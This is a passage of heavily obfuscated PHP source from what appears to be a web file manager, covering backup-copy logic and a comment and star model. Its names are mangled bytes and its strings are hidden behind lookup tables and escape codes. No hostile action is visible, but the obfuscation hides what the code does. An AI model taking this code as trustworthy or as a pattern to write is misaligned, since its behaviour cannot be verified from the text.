Model($ÒëéÎ“¸[847])->get($ÒëéÎ“¸[848]); $İ¬ÂÃô° = substr(md5($ÒëéÎ“¸[849] . $Ê€Ê˜ä¥ . $‚ÙĞ—¶¸), 0, 8); return "\173\x69\x6f\x3a{$¢Ğ ‚×ê[$ÒëéÎ“¸[828]]}\175\57\144\141\164\141\x62\141\x73\145\x2f\142\x61\x63\153\x75\160\57" . $‚ÙĞ—¶¸ . $ÒëéÎ“¸[11] . $İ¬ÂÃô°; } private function tmpFilesPath() { $ïÆ¨µÏ  =& $_SERVER[ıÚ˜š²İ]; $„ Ê¥Î› = TEMP_FILES; if ($GLOBALS[$ïÆ¨µÏ [6]][$ïÆ¨µÏ [92]][$ïÆ¨µÏ [875]]) { $„ Ê¥Î› = $GLOBALS[$ïÆ¨µÏ [6]][$ïÆ¨µÏ [92]][$ïÆ¨µÏ [875]]; if (!mk_dir($„ Ê¥Î›) || !is_writable($„ Ê¥Î›) || !IO::mkfile($„ Ê¥Î› . $ïÆ¨µÏ [876])) { $„ Ê¥Î› = TEMP_FILES; } } return $„ Ê¥Î›; } } class BackupFile { public function __construct() { } public function index() { $úšø÷ô = Backup::get(); $ä¤°—¤ = $úšø÷ô[$_SERVER[ıÚ˜š²İ][832]][$_SERVER[ıÚ˜š²İ][233]][$_SERVER[ıÚ˜š²İ][545]]; $ƒ®›ÙŠ‰ = array($_SERVER[ıÚ˜š²İ][546] => array($_SERVER[ıÚ˜š²İ][889], $ä¤°—¤), $_SERVER[ıÚ˜š²İ][890] => array($_SERVER[ıÚ˜š²İ][408], $úšø÷ô[$_SERVER[ıÚ˜š²İ][828]])); $àó¯ÀŒö = (int) Model($_SERVER[ıÚ˜š²İ][868])->where($ƒ®›ÙŠ‰)->count($_SERVER[ıÚ˜š²İ][545]); $Ø™·ãê = (int) Model($_SERVER[ıÚ˜š²İ][868])->where($ƒ®›ÙŠ‰)->sum($_SERVER[ıÚ˜š²İ][79]); $Óõ…Ã®­ = new TaskFileTransfer($_SERVER[ıÚ˜š²İ][891], $_SERVER[ıÚ˜š²İ][854], $àó¯ÀŒö, LNG($_SERVER[ıÚ˜š²İ][863]) . $_SERVER[ıÚ˜š²İ][864] . LNG($_SERVER[ıÚ˜š²İ][892])); $Óõ…Ã®­->task[$_SERVER[ıÚ˜š²İ][840]] = $Ø™·ãê; $¬–¦£ğâ = array($_SERVER[ıÚ˜š²İ][893] => $àó¯ÀŒö, $_SERVER[ıÚ˜š²İ][894] => $Ø™·ãê, $_SERVER[ıÚ˜š²İ][895] => time()); Backup::set($¬–¦£ğâ); $­Ù­é¾‡ = !0; $¿ ©úøˆ = $this->storeIds(); $ÙÈêÙ = 1; $¨ìÓŒÇ˜ = 1000; $‘ïš”ìö = $ƒñ‰‰†î = 0; $°ÔÌÂÀ™ = array(); $ñ‡Û£ëÃ = $ƒ·Áş¿Å = 0; do { $¬å”Âì = $_SERVER[ıÚ˜š²İ][896]; $ßİë•ïŠ = Model($_SERVER[ıÚ˜š²İ][868])->where($ƒ®›ÙŠ‰)->field($¬å”Âì)->order($_SERVER[ıÚ˜š²İ][897])->selectPage($¨ìÓŒÇ˜, $ÙÈêÙ); $¦Ÿæ”çà = !empty($ßİë•ïŠ[$_SERVER[ıÚ˜š²İ][447]]) ? $ßİë•ïŠ[$_SERVER[ıÚ˜š²İ][447]] : array(); foreach ($¦Ÿæ”çà as $˜ãòãĞå) { if (!$this->_fileExist($˜ãòãĞå, $°ÔÌÂÀ™, $¿ ©úøˆ)) { Backup::log($_SERVER[ıÚ˜š²İ][898] . $˜ãòãĞå[$_SERVER[ıÚ˜š²İ][545]] . $_SERVER[ıÚ˜š²İ][899] . $˜ãòãĞå[$_SERVER[ıÚ˜š²İ][87]]); continue; } $§–Ç¾® = $˜ãòãĞå[$_SERVER[ıÚ˜š²İ][87]]; $Ô…à¢üŒ = "\173\151\157\x3a{$úšø÷ô[$_SERVER[ıÚ˜š²İ][828]]}\x7d" . substr($§–Ç¾®, strlen("\x7b\151\157\72{$˜ãòãĞå[$_SERVER[ıÚ˜š²İ][900]]}\x7d")); if (IO::exist($Ô…à¢üŒ)) { $Óõ…Ã®­->updateFileEnd($˜ãòãĞå[$_SERVER[ıÚ˜š²İ][32]], $˜ãòãĞå[$_SERVER[ıÚ˜š²İ][79]]); } else { $Ô…à¢üŒ = get_path_father($Ô…à¢üŒ); IO::mkdir($Ô…à¢üŒ); if (!IO::copy($§–Ç¾®, $Ô…à¢üŒ, $_SERVER[ıÚ˜š²İ][901])) { Backup::log($_SERVER[ıÚ˜š²İ][902] . $§–Ç¾® . $_SERVER[ıÚ˜š²İ][884] . $Ô…à¢üŒ . $_SERVER[ıÚ˜š²İ][178]); $­Ù­é¾‡ = !1; break; } } $ä¤°—¤ = $˜ãòãĞå[$_SERVER[ıÚ˜š²İ][545]]; $ƒñ‰‰†î += 1; $‘ïš”ìö += $˜ãòãĞå[$_SERVER[ıÚ˜š²İ][79]]; $ƒ·Áş¿Å += 1; $ñ‡Û£ëÃ += $˜ãòãĞå[$_SERVER[ıÚ˜š²İ][79]]; if ($‘ïš”ìö >= 1024 * 1024 * 100) { $¬–¦£ğâ = array($_SERVER[ıÚ˜š²İ][827] => $ä¤°—¤, $_SERVER[ıÚ˜š²İ][903] => $ƒ·Áş¿Å, $_SERVER[ıÚ˜š²İ][904] => $ñ‡Û£ëÃ); Backup::set($¬–¦£ğâ); $‘ïš”ìö = $ƒñ‰‰†î = 0; } } $ä¡Î¤¯ä = count($¦Ÿæ”çà); $ÙÈêÙ++; } while ($ä¡Î¤¯ä == $¨ìÓŒÇ˜); $Óõ…Ã®­->end(); $¬–¦£ğâ = array($_SERVER[ıÚ˜š²İ][905] => 1, $_SERVER[ıÚ˜š²İ][838] => time(), $_SERVER[ıÚ˜š²İ][852] => 1, $_SERVER[ıÚ˜š²İ][827] => $ä¤°—¤, $_SERVER[ıÚ˜š²İ][906] => time()); if ($ƒñ‰‰†î) { $¬–¦£ğâ[$_SERVER[ıÚ˜š²İ][903]] = $ƒ·Áş¿Å; $¬–¦£ğâ[$_SERVER[ıÚ˜š²İ][904]] = $ñ‡Û£ëÃ; } Backup::set($¬–¦£ğâ); return !0; } private function _fileExist($Â…ĞÍ¨œ, &$Åîì‡ş, $÷Ó“úÔ¨) { $²ĞŠºÀ² =& $_SERVER[ıÚ˜š²İ]; $…ÓÂ†ù© = $Â…ĞÍ¨œ[$²ĞŠºÀ²[87]]; if (in_array($Â…ĞÍ¨œ[$²ĞŠºÀ²[545]], $Åîì‡ş)) { return !1; } if (!in_array($Â…ĞÍ¨œ[$²ĞŠºÀ²[900]], $÷Ó“úÔ¨)) { return !1; } if (IO::exist($…ÓÂ†ù©)) { return !0; } $»ÊÕŒ·÷ = get_path_father($…ÓÂ†ù©); if (IO::exist($»ÊÕŒ·÷)) { $Åîì‡ş[] = $Â…ĞÍ¨œ[$²ĞŠºÀ²[545]]; return !1; } $ùøóİÜâ = array($²ĞŠºÀ²[900] => $Â…ĞÍ¨œ[$²ĞŠºÀ²[900]], $²ĞŠºÀ²[87] => array($²ĞŠºÀ²[461], "{$»ÊÕŒ·÷}\45")); $ÇûƒÚ = Model($²ĞŠºÀ²[868])->where($ùøóİÜâ)->field($²ĞŠºÀ²[546])->select(); $Åîì‡ş = array_merge($Åîì‡ş, array_to_keyvalue($ÇûƒÚ, $²ĞŠºÀ²[12], $²ĞŠºÀ²[545])); return !1; } private function _fileFilter($Â¯ì½ñ) { $ÊÔ†ÖÖ¸ =& $_SERVER[ıÚ˜š²İ]; return; if (empty($Â¯ì½ñ)) { return; } $×ê—ı„´ = array($ÊÔ†ÖÖ¸[545] => array($ÊÔ†ÖÖ¸[7], array_unique($Â¯ì½ñ))); $©áÁäÌ¼ = Model($ÊÔ†ÖÖ¸[907])->where($×ê—ı„´)->field($ÊÔ†ÖÖ¸[194])->select(); foreach ($©áÁäÌ¼ as $ğŠ„À³ö) { Model($ÊÔ†ÖÖ¸[907])->remove($ğŠ„À³ö[$ÊÔ†ÖÖ¸[194]], !1); } } private function storeIds() { $÷´¥Ù¡£ =& $_SERVER[ıÚ˜š²İ]; $Ú˜˜¸ª… = Model($÷´¥Ù¡£[844])->listData(); $®İ•ÊÖ = array(); $î³Ş³»à = $GLOBALS[$÷´¥Ù¡£[6]][$÷´¥Ù¡£[92]][$÷´¥Ù¡£[908]]; foreach ($Ú˜˜¸ª… as $¯¡°Êƒ×) { $€Ì¶ïÚ« = strtolower($¯¡°Êƒ×[$÷´¥Ù¡£[98]]); if (!isset($î³Ş³»à[$€Ì¶ïÚ«])) { continue; } $ô–ˆáÃÁ = $÷´¥Ù¡£[77] . (isset($î³Ş³»à[$€Ì¶ïÚ«]) ? $î³Ş³»à[$€Ì¶ïÚ«] : ucfirst($€Ì¶ïÚ«)); if (!class_exists($ô–ˆáÃÁ)) { continue; } $®İ•ÊÖ[] = $¯¡°Êƒ×[$÷´¥Ù¡£[477]]; } return $®İ•ÊÖ; } } goto FšÎÅ¸˜¨; CµÚğ–§í: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\x62\x61\143\153\165\160\x4c\151\x73\164"; public $field = array("\x69\x6f", "\156\141\x6d\145", "\163\164\141\164\165\x73", "\x63\x6f\156\x74\x65\x6e\x74", "\x6d\x61\156\165\x61\154", "\162\145\x73\x75\154\x74", "\164\x69\x6d\145\x46\x72\x6f\x6d", "\164\x69\155\x65\124\157"); public function config() { $¥ÜòÖ– =& $_SERVER[ıÚ˜š²İ]; Action($¥ÜòÖ–[2018])->taskInit(); $·¨ÅŠø = Model($¥ÜòÖ–[847])->get($¥ÜòÖ–[854]); $·¨ÅŠø = json_decode($·¨ÅŠø, !0); $·¨ÅŠø = is_array($·¨ÅŠø) ? $·¨ÅŠø : array(); $this->parseContent($·¨ÅŠø); unset($·¨ÅŠø[$¥ÜòÖ–[1761]]); Model($¥ÜòÖ–[1760])->cacheClear(); $¬šÚ’âÚ = $¥ÜòÖ–[2019]; $ÃşÜçó  = Model($¥ÜòÖ–[2020])->findByKey($¥ÜòÖ–[1779], $¬šÚ’âÚ); if (!$ÃşÜçó ) { $ÃşÜçó  = array(); } if (isset($ÃşÜçó [$¥ÜòÖ–[207]])) { $ÃşÜçó [$¥ÜòÖ–[207]] = json_decode($ÃşÜçó [$¥ÜòÖ–[207]], !0); } if (isset($·¨ÅŠø[$¥ÜòÖ–[207]])) { $ÃşÜçó [$¥ÜòÖ–[207]][$¥ÜòÖ–[1764]] = $·¨ÅŠø[$¥ÜòÖ–[207]]; unset($·¨ÅŠø[$¥ÜòÖ–[207]]); } return array_merge($ÃşÜçó , $·¨ÅŠø); } public function listData($ñúå·ó‘ = false, $ª×éê¬÷ = "\155\157\144\x69\146\171\x54\x69\x6d\145", $åÈÈ´¿‘ = false) { $¬ŒÒÃÍ = parent::listData($ñúå·ó‘, $ª×éê¬÷, !0); if (!$¬ŒÒÃÍ) { return $¬ŒÒÃÍ; } if ($ñúå·ó‘) { $¬ŒÒÃÍ = array($¬ŒÒÃÍ); } foreach ($¬ŒÒÃÍ as &$À‹Ä„±…) { $this->parseContent($À‹Ä„±…); } return $ñúå·ó‘ ? $¬ŒÒÃÍ[0] : $¬ŒÒÃÍ; } public function parseContent(&$”·‚ß™Í) { $¸ı­«ß½ =& $_SERVER[ıÚ˜š²İ]; $ç»ø¡òº = _get($”·‚ß™Í, $¸ı­«ß½[171], $¸ı­«ß½[91]); if (!in_array($ç»ø¡òº, array($¸ı­«ß½[853], $¸ı­«ß½[1221]))) { $”·‚ß™Í[$¸ı­«ß½[171]] = $ç»ø¡òº == $¸ı­«ß½[91] ? $¸ı­«ß½[1221] : $¸ı­«ß½[853]; } } public function lastItem() { $ÓˆªŒ™ë = $this->listData(); return !empty($ÓˆªŒ™ë[0]) ? $ÓˆªŒ™ë[0] : null; } public function kill($Ùí Ï‘Ç) { $³Ç¥˜ÑË =& $_SERVER[ıÚ˜š²İ]; $ˆş÷­ÑÏ = $this->listData($Ùí Ï‘Ç); if (!$ˆş÷­ÑÏ || empty($ˆş÷­ÑÏ[$³Ç¥˜ÑË[32]])) { return !0; } Task::kill($³Ç¥˜ÑË[862]); Task::kill($³Ç¥˜ÑË[881]); Task::kill($³Ç¥˜ÑË[891]); $õÕáç°ø = $ˆş÷­ÑÏ[$³Ç¥˜ÑË[32]]; $½¹Ç‰ = TEMP_FILES . $³Ç¥˜ÑË[857] . $õÕáç°ø . $³Ç¥˜ÑË[8]; IO::remove($½¹Ç‰, !1); return $this->remove($Ùí Ï‘Ç); } public function remove($ÛâÀ†Š‡) { $›ø—Üø¯ = $this->listData($ÛâÀ†Š‡); if (!$›ø—Üø¯) { return !0; } return $this->backupRemove($›ø—Üø¯); } private function backupRemove($ğœÄŞß) { parent::remove($ğœÄŞß[$_SERVER[ıÚ˜š²İ][477]]); $›Ññ¥ = $this->backupPath($ğœÄŞß); IO::remove($›Ññ¥, !1); return !0; } private function backupPath($Áœ¢æ®Ç) { $Ã¼æø›² =& $_SERVER[ıÚ˜š²İ]; $¼·İåºÀ = $Áœ¢æ®Ç[$Ã¼æø›²[32]]; $Ş³ëöĞá = Model($Ã¼æø›²[847])->get($Ã¼æø›²[848]); $Ä®î¨É¸ = substr(md5($Ã¼æø›²[849] . $Ş³ëöĞá . $¼·İåºÀ), 0, 8); return "\x7b\151\157\72{$Áœ¢æ®Ç[$Ã¼æø›²[828]]}\175\x2f\x64\141\164\x61\142\141\163\x65\x2f\142\141\x63\153\165\x70\57" . $¼·İåºÀ . $Ã¼æø›²[11] . $Ä®î¨É¸; } public function start() { $çÉçÂ¡ô =& $_SERVER[ıÚ˜š²İ]; if ($GLOBALS[$çÉçÂ¡ô[6]][$çÉçÂ¡ô[92]][$çÉçÂ¡ô[2021]] != $çÉçÂ¡ô[91]) { return !0; } $¼ğ–®Ò = $this->config(); if (!$¼ğ–®Ò || $¼ğ–®Ò[$çÉçÂ¡ô[1761]] != $çÉçÂ¡ô[91]) { return !1; } if ($¼ğ–®Ò[$çÉçÂ¡ô[171]] == $çÉçÂ¡ô[853]) { $–‘Ûğıá = Model($çÉçÂ¡ô[847])->get($çÉçÂ¡ô[1338]); if ($–‘Ûğıá == $çÉçÂ¡ô[1339]) { $¼ğ–®Ò[$çÉçÂ¡ô[171]] = $çÉçÂ¡ô[1221]; } } $³ùÍ±¤ô = $this->process(); foreach ($³ùÍ±¤ô as $Šô‘Ç†) { if ($Šô‘Ç†) { return Task::restart($Šô‘Ç†[$çÉçÂ¡ô[477]]); } } $ÜÑÈ¡ËŞ = new Backup(); $î…ÖÊÑÃ = $ÜÑÈ¡ËŞ->db(); if ($î…ÖÊÑÃ) { $î…ÖÊÑÃ = $ÜÑÈ¡ËŞ->dbFile(); if ($î…ÖÊÑÃ && $¼ğ–®Ò[$çÉçÂ¡ô[171]] == $çÉçÂ¡ô[853]) { $î…ÖÊÑÃ = $ÜÑÈ¡ËŞ->file(); } } Backup::set(array($çÉçÂ¡ô[826] => 1, $çÉçÂ¡ô[838] => time())); return !0; } public function process() { $š©±Ûœï =& $_SERVER[ıÚ˜š²İ]; $Ûº¤÷ú§ = array($š©±Ûœï[834] => Task::get($š©±Ûœï[862]), $š©±Ûœï[839] => Task::get($š©±Ûœï[881]), $š©±Ûœï[233] => Task::get($š©±Ûœï[891])); $¢Éô²÷ô = !1; foreach ($Ûº¤÷ú§ as &$³äšÌøæ) { if ($¢Éô²÷ô) { $³äšÌøæ = !1; continue; } if ($³äšÌøæ) { $şŞ›ğ¤Ó = intval(_get($³äšÌøæ, $š©±Ûœï[1797], 0)); if (time() - $şŞ›ğ¤Ó > 7200) { Task::kill($³äšÌøæ[$š©±Ûœï[477]]); $¢Éô²÷ô = !0; $³äšÌøæ = !1; } } } return $Ûº¤÷ú§; } public function restore() { $á«©¾¶ =& $_SERVER[ıÚ˜š²İ]; ActionCall($á«©¾¶[1149], !0, 1); ActionCall($á«©¾¶[1149], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\x6d\145\156\164"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\x61\155\x65" => "\143\x6f\x6d\x6d\x65\156\164\137\x6d\145\x74\x61", "\155\145\164\141\106\151\x65\154\144" => "\x63\157\x6d\155\145\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($©ÉùŞş) { $Àíó¹Í =& $_SERVER[ıÚ˜š²İ]; if ($©ÉùŞş[$Àíó¹Í[2022]]) { $í‡ÑØºÇ = $this->where(array($Àíó¹Í[2023] => $©ÉùŞş[$Àíó¹Í[2022]]))->find(); if (!$í‡ÑØºÇ || $í‡ÑØºÇ[$Àíó¹Í[191]] != $©ÉùŞş[$Àíó¹Í[191]] || $í‡ÑØºÇ[$Àíó¹Í[573]] != $©ÉùŞş[$Àíó¹Í[573]]) { return !1; } $this->where(array($Àíó¹Í[2023] => $©ÉùŞş[$Àíó¹Í[2022]]))->setAdd($Àíó¹Í[2024], 1); } $©ÉùŞş[$Àíó¹Í[2025]] = 0; $©ÉùŞş[$Àíó¹Í[2024]] = 0; $©ÉùŞş[$Àíó¹Í[826]] = 1; return $this->add($©ÉùŞş); } public function commentCount($‡¹ÅòÒÀ, $ô µûòª, $ßÈ€Üøñ = false) { $ŒÆ¤ =& $_SERVER[ıÚ˜š²İ]; if (!$‡¹ÅòÒÀ) { return array(); } if (is_string($‡¹ÅòÒÀ) || is_int($‡¹ÅòÒÀ)) { $‡¹ÅòÒÀ = array($‡¹ÅòÒÀ); } $±Êï„€î = array($ŒÆ¤[573], $ŒÆ¤[2026] => $ŒÆ¤[569]); $´ª…¹©Ñ = array($ŒÆ¤[573] => array($ŒÆ¤[7], $‡¹ÅòÒÀ), $ŒÆ¤[191] => $ô µûòª); if ($ßÈ€Üøñ) { $´ª…¹©Ñ[$ŒÆ¤[1792]] = $ßÈ€Üøñ; } $¾İş±„» = $this->field($±Êï„€î)->where($´ª…¹©Ñ)->group($ŒÆ¤[573])->select(); return array_to_keyvalue($¾İş±„», $ŒÆ¤[573], $ŒÆ¤[569]); } public function starTarget($÷§î¡ë, $¨³íô¬†) { $–Æ’øÚ =& $_SERVER[ıÚ˜š²İ]; $ÚÛï´® = $÷§î¡ë + self::TYPE_STAR_OFFSET; $ı£ßË„ú = array($–Æ’øÚ[1792] => USER_ID, $–Æ’øÚ[191] => $ÚÛï´®, $–Æ’øÚ[573] => $¨³íô¬†); $à›Ê«à” = $this->where($ı£ßË„ú)->find(); if ($à›Ê«à”) { return $this->where(array($–Æ’øÚ[477] => $à›Ê«à”[$–Æ’øÚ[477]]))->delete(); } $±ßú–÷é = array($–Æ’øÚ[2022] => 0, $–Æ’øÚ[1792] => USER_ID, $–Æ’øÚ[826] => 1, $–Æ’øÚ[171] => $–Æ’øÚ[12], $–Æ’øÚ[191] => $ÚÛï´®, $–Æ’øÚ[573] => $¨³íô¬†, $–Æ’øÚ[2025] => 0, $–Æ’øÚ[2024] => 0); return $this->add($±ßú–÷é); } public function starTargetCount($»çğÜª, $“à¼¬Í) { $ªÉİüõ =& $_SERVER[ıÚ˜š²İ]; $Æ˜ÇªÌŠ = $“à¼¬Í + self::TYPE_STAR_OFFSET; $ã®Ğû£ = $this->commentCount($»çğÜª, $Æ˜ÇªÌŠ); $ÜŸ½ÁºÔ = $this->commentCount($»çğÜª, $Æ˜ÇªÌŠ, USER_ID); return array($ªÉİüõ[2027] => $ã®Ğû£, $ªÉİüõ[2028] => $ÜŸ½ÁºÔ); } public function starTargetUserList($®€¥èÒ¼, $Œ’ª’Ä) { $¢—©¤·½ =& $_SERVER[ıÚ˜š²İ]; $²‚“‘ö· = $®€¥èÒ¼ + self::TYPE_STAR_OFFSET; $õÔÇÉÍó = array($¢—©¤·½[573] => $Œ’ª’Ä, $¢—©¤·½[191] => $²‚“‘ö·); $‰ˆöÄÚ‹ = $this->where($õÔÇÉÍó)->count(); $Ú£ğ¡ Æ = array($¢—©¤·½[335] => $‰ˆöÄÚ‹, $¢—©¤·½[2029] => array()); if (!$‰ˆöÄÚ‹) { return $Ú£ğ¡ Æ; } $ÔÏáË©ï = $this->field($¢—©¤·½[1792])->where($õÔÇÉÍó)->limit(500)->select(); $ÔÏáË©ï = array_to_keyvalue($ÔÏáË©ï, $¢—©¤·½[12], $¢—©¤·½[1792]); $Ú£ğ¡ Æ[$¢—©¤·½[2029]] = Model($¢—©¤·½[581])->userListInfo($ÔÏáË©ï); return $Ú£ğ¡ Æ; } public function prasiseUserList($î¹¡†‹’) { $ÅŞøÀ‹‰ =& $_SERVER[ıÚ˜š²İ]; $¦¿¥ ß = array($ÅŞøÀ‹‰[2030] => $î¹¡†‹’); $­Ñ¨¾øÉ = $this->where($¦¿¥ ß)->find(); $æ£ğÇ‡Û = _get($­Ñ¨¾øÉ, $ÅŞøÀ‹‰[2025], 0); $ñ³ş¸Ş = array($ÅŞøÀ‹‰[335] => $æ£ğÇ‡Û, $ÅŞøÀ‹‰[2029] => array()); if (!$æ£ğÇ‡Û) { return $ñ³ş¸Ş; } $Ë„Š¹˜ = Model($ÅŞøÀ‹‰[2031])->field($ÅŞøÀ‹‰[1792])->where($¦¿¥ ß)->limit(500)->select(); $Ë„Š¹˜ = array_to_keyvalue($Ë„Š¹˜, $ÅŞøÀ‹‰[12], $ÅŞøÀ‹‰[1792]); $ñ³ş¸Ş[$ÅŞøÀ‹‰[2029]] = Model($ÅŞøÀ‹‰[581])->userListInfo($Ë„Š¹˜); return $ñ³ş¸Ş; } public function remove($·¸€µË) { $ÚâØ¼©Á =& $_SERVER[ıÚ˜š²İ]; $ŒÃ¡Öü¤ = array($ÚâØ¼©Á[2023] => $·¸€µË); $¬ÌˆşäÖ = $this->where($ŒÃ¡Öü¤)->find(); if ($¬ÌˆşäÖ[$ÚâØ¼©Á[2022]]) { $this->where(array($ÚâØ¼©Á[2023] => $¬ÌˆşäÖ[$ÚâØ¼©Á[2022]]))->setAdd($ÚâØ¼©Á[2024], -1); } return $this->removeArray($·¸€µË); } public function edit($¶ª¼®ä, $ïÄĞØó±) { $À¸ØÔÈ™ =& $_SERVER[ıÚ˜š²İ]; $½Ñ±„ı = array($À¸ØÔÈ™[2023] => $¶ª¼®ä); return $this->where($½Ñ±„ı)->save(array($À¸ØÔÈ™[2032] => $ïÄĞØó±)); } public function prasise($ƒÓŸáÄÅ) { $ƒ†¿î†Ü =& $_SERVER[ıÚ˜š²İ]; $˜ÛÕã·‰ = Model($ƒ†¿î†Ü[2033]); $ó†ûŞĞË = array($ƒ†¿î†Ü[2023] => $ƒÓŸáÄÅ, $ƒ†¿î†Ü[1783] => USER_ID); $­®º¹¿ = $˜ÛÕã·‰->where($ó†ûŞĞË)->find(); if (!$­®º¹¿) { $˜ÛÕã·‰->add($ó†ûŞĞË); $«€ß¯Ğİ = $this->where(array($ƒ†¿î†Ü[2023] => $ƒÓŸáÄÅ))->setAdd($ƒ†¿î†Ü[2025], 1); } else { $˜ÛÕã·‰->where($ó†ûŞĞË)->delete(); $«€ß¯Ğİ = $this->where(array($ƒ†¿î†Ü[2023] => $ƒÓŸáÄÅ))->setAdd($ƒ†¿î†Ü[2025], -1); } return $«€ß¯Ğİ; } public function targetInfo($Ù´–û«, $éÀÅ³) { $–Æ¥¶‘Û =& $_SERVER[ıÚ˜š²İ]; $¶Â¢­¯ø = array($–Æ¥¶‘Û[655] => $Ù´–û«, $–Æ¥¶‘Û[656] => $éÀÅ³); $¶³£ ¢Ë = $this->where($¶Â¢­¯ø)->count(); $èÃû¦›Ö = "\x52\111\x47\110\124\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\143\157\155\155\x65\x6e\164\137\x70\x72\x61\x69\x73\145\x20\x73\164\141\x72\40\157\156\40\143\x6f\x6d\155\145\x6e\164\x2e\x63\157\x6d\155\x65\156\164\111\104\x20\x3d\x20\163\164\141\162\56\143\x6f\x6d\x6d\x65\x6e\x74\x49\104"; $‹Öóƒ§¬ = $this->alias($–Æ¥¶‘Û[431])->where($¶Â¢­¯ø)->join($èÃû¦›Ö, $–Æ¥¶‘Û[2034])->count(); $¢«¬ÏÔ“ = array($–Æ¥¶‘Û[2035] => $¶³£ ¢Ë, $–Æ¥¶‘Û[2036] => $‹Öóƒ§¬); return $¢«¬ÏÔ“; } public function listData($ø·º½Š’) { $…ĞÄô´È =& $_SERVER[ıÚ˜š²İ]; if (isset($ø·º½Š’[$…ĞÄô´È[2037]])) { if ($ø·º½Š’[$…ĞÄô´È[2037]]) { $ø·º½Š’[$…ĞÄô´È[2030]] = array($…ĞÄô´È[1103], intval($ø·º½Š’[$…ĞÄô´È[2037]])); } unset($ø·º½Š’[$…ĞÄô´È[2037]]); } if (isset($ø·º½Š’[$…ĞÄô´È[2038]])) { if ($ø·º½Š’[$…ĞÄô´È[2038]]) { $ø·º½Š’[$…ĞÄô´È[2030]] = array($…ĞÄô´È[1100], intval($ø·º½Š’[$…ĞÄô´È[2038]])); } unset($ø·º½Š’[$…ĞÄô´È[2038]]); } return $this->_listData($ø·º½Š’); } private function _listData($Ã†¾—) { $ü³×÷ä  =& $_SERVER[ıÚ˜š²İ]; $åãÖ©œ = $this->where($Ã†¾—)->_makeOrder()->selectPage(100); $this->_listAppendParent($åãÖ©œ[$ü³×÷ä [447]]); $this->_listAppendUser($åãÖ©œ[$ü³×÷ä [447]]); $this->_listAppendMeta($åãÖ©œ[$ü³×÷ä [447]]); return $åãÖ©œ; } private function _makeOrder() { $ö¼Ò½Õ =& $_SERVER[ıÚ˜š²İ]; $Âİã€ëí = array($ö¼Ò½Õ[2025], $ö¼Ò½Õ[2024], $ö¼Ò½Õ[234]); $÷˜®Ìƒô = Input::get($ö¼Ò½Õ[532], $ö¼Ò½Õ[7], $ö¼Ò½Õ[499], $Âİã€ëí); $æ­ÀÍ»„ = Input::get($ö¼Ò½Õ[533], $ö¼Ò½Õ[7], $ö¼Ò½Õ[1785], array($ö¼Ò½Õ[2039], $ö¼Ò½Õ[528])); $’´ä³… = $÷˜®Ìƒô . $ö¼Ò½Õ[53] . $æ­ÀÍ»„; return $this->order($’´ä³…); } private function _listAppendParent(&$ñíœ…üÌ) { $È‰§©È¡ =& $_SERVER[ıÚ˜š²İ]; $ÔÜğŞæ­ = array_unique(array_to_keyvalue($ñíœ…üÌ, $È‰§©È¡[12], $È‰§©È¡[2022])); $ÔÜğŞæ­ = array_remove_value($ÔÜğŞæ­, $È‰§©È¡[231]); if (!$ÔÜğŞæ­) { return; } $ïö¤Ğä³ = $this->where(array($È‰§©È¡[2023] => array($È‰§©È¡[7], $ÔÜğŞæ­)))->select(); $ïö¤Ğä³ = array_to_keyvalue($ïö¤Ğä³, $È‰§©È¡[2030]); foreach ($ñíœ…üÌ as &$’ÁòıÁà) { if (isset($ïö¤Ğä³[$’ÁòıÁà[$È‰§©È¡[2022]]])) { $’ÁòıÁà[$È‰§©È¡[2040]] = $ïö¤Ğä³[$’ÁòıÁà[$È‰§©È¡[2022]]]; } } unset($’ÁòıÁà); } private function _listAppendUser(&$Ë‚ „ˆ—) { $¯ú½«ïÉ =& $_SERVER[ıÚ˜š²İ]; $¹èˆ•©• = array_unique(array_to_keyvalue($Ë‚ „ˆ—, $¯ú½«ïÉ[12], $¯ú½«ïÉ[1792])); $¹èˆ•©• = array_remove_value($¹èˆ•©•, $¯ú½«ïÉ[231]); if (count($¹èˆ•©•) == 0) { return; } foreach ($Ë‚ „ˆ— as $”–ªã§æ) { if (isset($”–ªã§æ[$¯ú½«ïÉ[2040]])) { $¹èˆ•©•[] = $”–ªã§æ[$¯ú½«ïÉ[2040]][$¯ú½«ïÉ[1792]]; } } $Øœ°±¯  = Model($¯ú½«ïÉ[601])->userListInfo($¹èˆ•©•); foreach ($Ë‚ „ˆ— as &$”–ªã§æ) { $”–ªã§æ[$¯ú½«ïÉ[669]] = $Øœ°±¯ [$”–ªã§æ[$¯ú½«ïÉ[1792]]]; if (isset($”–ªã§æ[$¯ú½«ïÉ[2040]])) { $”–ªã§æ[$¯ú½«ïÉ[2040]][$¯ú½«ïÉ[669]] = $Øœ°±¯ [$”–ªã§æ[$¯ú½«ïÉ[2040]][$¯ú½«ïÉ[1792]]]; } } unset($”–ªã§æ); } private function _listAppendMeta(&$¡ÙŒÃŸ) { $ÌÆ„„˜õ =& $_SERVER[ıÚ˜š²İ]; $‹óçê…Û = array_unique(array_to_keyvalue($¡ÙŒÃŸ, $ÌÆ„„˜õ[12], $ÌÆ„„˜õ[2030])); $‹óçê…Û = array_remove_value($‹óçê…Û, $ÌÆ„„˜õ[231]); if (!$‹óçê…Û) { return; } foreach ($¡ÙŒÃŸ as $ÎïË¦£½) { if (isset($ÎïË¦£½[$ÌÆ„„˜õ[2040]])) { $‹óçê…Û[] = $ÎïË¦£½[$ÌÆ„„˜õ[2040]][$ÌÆ„„˜õ[2030]]; } } $ë›«˜ıÎ = $this->metaList($‹óçê…Û); if (!$ë›«˜ıÎ) { return !1; } foreach ($¡ÙŒÃŸ as &$ÎïË¦£½) { $ÎïË¦£½[$ÌÆ„„˜õ[543]] = $ë›«˜ıÎ[$ÎïË¦£½[$ÌÆ„„˜õ[2030]]]; if (isset($ÎïË¦£½[$ÌÆ„„˜õ[2040]])) { $ÎïË¦£½[$ÌÆ„„˜õ[2040]][$ÌÆ„„˜õ[543]] = 